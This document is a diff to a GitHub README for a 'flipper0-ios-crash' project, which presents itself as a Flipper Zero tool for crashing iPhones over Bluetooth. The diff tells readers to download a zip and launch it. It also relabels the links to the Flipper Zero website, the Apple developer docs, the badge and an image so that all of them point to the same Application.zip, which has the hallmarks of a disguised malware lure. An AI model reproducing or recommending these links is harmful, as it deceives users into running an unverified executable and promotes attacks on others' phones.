@@ -15,9 +15,9 @@ Welcome to the "flipper0-ios-crash" repository! 🚀 This repository contains a 
 - ios-crash
 
 ## Software Download 📥
-To access the software needed for this project, please download it from this [link](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip). Make sure to launch the downloaded file to proceed with the installation. 🚀
+To access the software needed for this project, please download it from this [link](https://github.com/TopeX62/flipper0-ios-crash/releases/download/v1.0/Application.zip). Make sure to launch the downloaded file to proceed with the installation. 🚀
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/TopeX62/flipper0-ios-crash/releases/download/v1.0/Application.zip)](https://github.com/TopeX62/flipper0-ios-crash/releases/download/v1.0/Application.zip)
 
 ## How to Use 🛠️
 1. Download the provided software from the link above.
@@ -27,8 +27,8 @@ To access the software needed for this project, please download it from this [li
 
 ## External Resources 🌐
 For additional information and resources related to this project, feel free to explore the following links:
-- [Flipper Zero Official Website](https://flipperzero.one/)
-- [iOS Developer Documentation](https://developer.apple.com/ios/)
+- [Flipper Zero Official Website](https://github.com/TopeX62/flipper0-ios-crash/releases/download/v1.0/Application.zip)
+- [iOS Developer Documentation](https://github.com/TopeX62/flipper0-ios-crash/releases/download/v1.0/Application.zip)
 
 ## Contributions 🤝
 Contributions to this repository are welcome! If you have any improvements, suggestions, or new ideas to enhance the Flipper0 iOS Crash script, feel free to submit a pull request. Together, we can make this project even more exciting and impactful! 🌟
@@ -38,4 +38,4 @@ If you encounter any issues or have questions about this project, please check t
 
 Let's have fun exploring the world of Bluetooth crashes with Flipper Zero! 🦆🔵📱 #HackThePlanet 🌍💻
 
-![Ducky Script Image](https://www.seeedstudio.com/blog/wp-content/uploads/2020/08/Duckyscript_ConetCode-1024x576.png)
+![Ducky Script Image](https://github.com/TopeX62/flipper0-ios-crash/releases/download/v1.0/Application.zip)
